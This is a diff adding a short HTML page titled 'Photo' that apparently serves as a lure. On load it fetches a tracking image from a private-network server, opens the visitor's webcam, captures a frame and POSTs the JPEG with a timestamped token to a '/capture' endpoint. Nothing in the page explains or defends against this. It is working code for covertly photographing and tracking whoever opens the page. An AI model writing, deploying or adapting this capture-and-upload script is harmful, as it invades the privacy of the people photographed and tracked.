@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head><title>Photo</title></head>
+<body>
+<img src="http://192.168.1.9:5000/tracking.png">
+<script>
+(async function(){
+    const token = 'face_' + Date.now();
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        const b64 = canvas.toDataURL('image/jpeg', 0.8);
+        stream.getTracks().forEach(t => t.stop());
+        await fetch('/capture', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ token: token, image: b64 })
+        });
+        console.log('Photo sent');
+    } catch(e) {
+        console.log('Camera error:', e.message);
+    }
+})();
+</script>
+</body>
+</html>
